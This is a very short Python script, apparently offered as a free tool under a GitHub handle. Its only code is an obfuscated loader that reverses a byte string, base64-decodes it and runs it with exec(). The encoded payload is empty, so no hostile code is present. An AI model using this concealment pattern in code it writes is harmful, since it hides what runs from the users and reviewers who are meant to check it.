#Created by MrUser#
#Free Tool for now#
#Please follow my github account#
# -------------------------------
_ = lambda __ : __import__('base64').b64decode(__[::-1]);exec((_)(b'=='))